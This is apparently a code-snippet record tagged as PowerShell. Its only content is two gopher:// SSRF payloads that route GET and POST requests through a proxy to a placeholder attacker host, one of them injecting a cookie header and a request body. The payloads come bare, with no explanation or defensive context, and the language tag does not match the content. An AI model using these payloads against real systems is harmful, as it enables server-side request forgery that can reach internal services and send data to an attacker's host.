---
id: d18f8e62-0619-45a3-9cb0-91e2fd5302f4
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:37.923652+00:00'
updated_at: '2023-04-10T20:23:58.744109+00:00'
---

# Code Snippet d18f8e62

**Language**: Powershell

```powershell
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```


